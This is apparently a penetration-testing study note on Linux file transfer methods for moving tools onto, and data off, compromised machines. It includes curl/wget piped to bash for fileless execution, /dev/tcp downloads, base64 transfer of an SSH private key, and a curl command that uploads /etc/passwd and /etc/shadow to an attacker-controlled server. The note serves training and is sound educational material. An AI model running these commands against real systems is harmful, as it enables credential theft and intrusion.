# 03 — Linux File Transfer Methods

## Overview

Linux is versatile with many built-in tools for file transfers. Understanding these methods is critical for both attackers and defenders.

### Real-World Incident Response Example

During an IR engagement, threat actors exploited a SQL Injection vulnerability and used a Bash script that attempted **3 download methods** in sequence:

```
1. cURL   → if that failed...
2. wget   → if that failed...
3. Python → last resort
```

All three used **HTTP/HTTPS** — the most common protocol for malware communication across all operating systems.

> **Key Lesson:** Attackers build redundancy into their tooling. You should too.

---

## Download Operations

### Method 1: Base64 Encoding / Decoding

**Use Case:** Transfer files **without network communication** — encode on one machine, paste on the other.

#### Step 1: Check MD5 Hash (Attack Machine)

```bash
md5sum id_rsa
```

```
4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Step 2: Encode to Base64 (Attack Machine)

```bash
cat id_rsa | base64 -w 0; echo
```

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

> `-w 0` = no line wrapping (single continuous string)  
> `; echo` = starts a new line to make copying easier

#### Step 3: Decode on Target Machine

```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...' | base64 -d > id_rsa
```

#### Step 4: Verify MD5 Hashes Match

```bash
md5sum id_rsa
```

```
4e301756a07ded0a2dd6953abf015278  id_rsa
```

> ✅ Hashes match = successful transfer

> **Tip:** This works in reverse too — encode on compromised target, decode on your attack machine.

---

### Method 2: Web Downloads with wget and cURL

The two most common Linux download utilities. Installed on most distributions by default.

#### wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

> `-O` (uppercase) = set output filename

#### cURL

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

> `-o` (lowercase) = set output filename

| Tool | Output Flag | Installed By Default | Notes |
|------|-----------|---------------------|-------|
| **wget** | `-O` (uppercase) | Most distros | Simple, reliable |
| **cURL** | `-o` (lowercase) | Most distros | More flexible, supports more protocols |

---

### Method 3: Fileless Attacks Using Linux

Linux pipes make fileless execution natural — download and execute directly in memory without writing to disk.

#### Fileless with cURL

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless with wget

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

> `-q` = quiet mode (no progress output)  
> `-O-` = output to stdout (the dash means stdout)

> ⚠️ **Note:** Some payloads like `mkfifo` still write temporary files to disk even when piped. "Fileless" refers to the execution method, not necessarily the payload behavior.

---

### Method 4: Download with Bash `/dev/tcp`

**Use Case:** When **no transfer tools** (wget, curl, python) are available. Works with Bash 2.04+ compiled with `--enable-net-redirections`.

#### Step 1: Connect to Target Web Server

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

#### Step 2: Send HTTP GET Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Step 3: Print the Response

```bash
cat <&3
```

> **When to use this:** Last resort when you have a bare Bash shell with no other tools. Rare but critical to know.

---

### Method 5: SSH Downloads (SCP)

**Use Case:** When SSH (TCP/22) is allowed — secure encrypted transfer.

#### Setup SSH Server on Attack Machine

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

#### Verify SSH Is Listening

```bash
netstat -lnpt
```

```
Proto Recv-Q Send-Q Local Address     Foreign Address     State       PID/Program name
tcp        0      0 0.0.0.0:22        0.0.0.0:*           LISTEN      -
```

#### Download File Using SCP

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

> **Tip:** Create a temporary user account for file transfers — don't use your primary credentials on a remote compromised machine.

---

## Upload Operations

### Method 1: Web Upload (HTTPS with uploadserver)

Secure upload using Python's `uploadserver` module with a self-signed certificate.

#### Step 1: Install uploadserver (Attack Machine)

```bash
sudo python3 -m pip install --user uploadserver
```

#### Step 2: Create Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

#### Step 3: Start HTTPS Upload Server

```bash
# Create separate directory (don't host the cert in the webroot)
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```
File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

#### Step 4: Upload from Compromised Target

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

> `--insecure` = bypass self-signed certificate warning (we trust our own cert)  
> `-F 'files=@/path'` = specify file to upload (can send multiple with multiple `-F` flags)

---

### Method 2: Quick Web Servers (For Downloads FROM Target)

Start a web server on the **compromised target**, then download files from your attack machine.

| Language | Command | Default Port |
|----------|---------|-------------|
| **Python 3** | `python3 -m http.server` | 8000 |
| **Python 2** | `python2.7 -m SimpleHTTPServer` | 8000 |
| **PHP** | `php -S 0.0.0.0:8000` | 8000 |
| **Ruby** | `ruby -run -ehttpd . -p8000` | 8000 |

#### Example: Python 3 Web Server on Target

```bash
# On compromised target — serve files from current directory
python3 -m http.server 8000
```

#### Download from Attack Machine

```bash
# On your attack machine
wget 192.168.49.128:8000/filetotransfer.txt
```

> ⚠️ **Important:** When starting a web server on a compromised target, remember that **inbound traffic** to that port may be blocked by the target's firewall. You're downloading FROM the target, not uploading TO it.

---

### Method 3: SCP Upload

When SSH (TCP/22) outbound is allowed from the target network.

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

> SCP syntax is similar to `cp` or `copy` — source first, then destination.

---

## Quick Reference Tables

### Download Methods

| Method | Requires | Network Needed? | Fileless? | Best For |
|--------|----------|----------------|-----------|----------|
| **Base64** | Terminal access | ❌ No | ❌ No | Small files, no network |
| **wget** | wget installed | ✅ Yes (HTTP) | ❌ No | Standard downloads |
| **cURL** | curl installed | ✅ Yes (HTTP) | ❌ No | Flexible downloads |
| **cURL \| bash** | curl + bash | ✅ Yes (HTTP) | ✅ Yes | In-memory execution |
| **wget \| python3** | wget + python3 | ✅ Yes (HTTP) | ✅ Yes | Fileless Python scripts |
| **/dev/tcp** | Bash 2.04+ | ✅ Yes (TCP) | ❌ No | No tools available |
| **SCP** | SSH access | ✅ Yes (SSH/22) | ❌ No | Encrypted transfers |

### Upload Methods

| Method | Setup Required (Attack Machine) | Best For |
|--------|-------------------------------|----------|
| **uploadserver (HTTPS)** | `uploadserver` + self-signed cert | Secure file exfiltration |
| **Python/PHP/Ruby web server** | None (use installed language) | Quick file serving from target |
| **SCP** | SSH server running | Encrypted uploads |
| **Base64** | Terminal access | Small files, paste to attack machine |

### One-Liner Web Servers

```bash
# Python 3
python3 -m http.server 8000

# Python 2
python2.7 -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

---

## Key Takeaways

- **Real-world malware** builds redundancy: cURL → wget → Python (try multiple methods)
- **Base64** works without network but only practical for small files
- **wget vs cURL**: output flag is `-O` (uppercase) for wget, `-o` (lowercase) for cURL
- **Fileless execution** via pipes (`curl ... | bash`) avoids writing to disk
- **`/dev/tcp`** is the last resort when no transfer tools are available — Bash built-in
- **SCP** is the go-to when SSH is allowed — encrypted and reliable
- **uploadserver** with HTTPS provides secure upload capability with `--insecure` for self-signed certs
- **Quick web servers** (Python/PHP/Ruby) can be spun up on compromised targets for file exfiltration
- **Create temporary accounts** for file transfers — never use primary credentials on compromised machines
- Starting a web server on a target means **inbound traffic** must be allowed to that port

---

## Module Questions & Answers

*Add exercise answers here as you complete them*
